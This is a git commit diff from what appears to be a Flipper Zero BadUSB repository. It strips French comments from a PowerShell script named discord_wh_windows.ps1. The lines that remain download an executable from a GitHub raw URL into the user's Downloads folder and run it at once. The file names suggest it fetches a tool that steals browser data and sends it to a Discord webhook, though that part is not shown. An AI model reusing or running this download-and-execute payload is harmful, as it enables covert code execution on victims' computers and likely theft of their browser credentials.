afd62ad32ece2a017a2fcb0a721170d902d55308
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-25 21:15:51 +0100

    remove comment

--- badusb/BrowserData/discord_wh_windows.ps1
+++ badusb/BrowserData/discord_wh_windows.ps1
@@ -1,11 +1,4 @@
-# Spécifiez l'URL du fichier à télécharger
 $url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
-
-# Spécifiez le chemin de destination pour le téléchargement
 $destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads')
-
-# Télécharge le fichier depuis l'URL spécifiée
 Invoke-WebRequest -Uri $url -OutFile $destination
-
-# Exécute le fichier téléchargé
 Start-Process -FilePath $destination -Wait
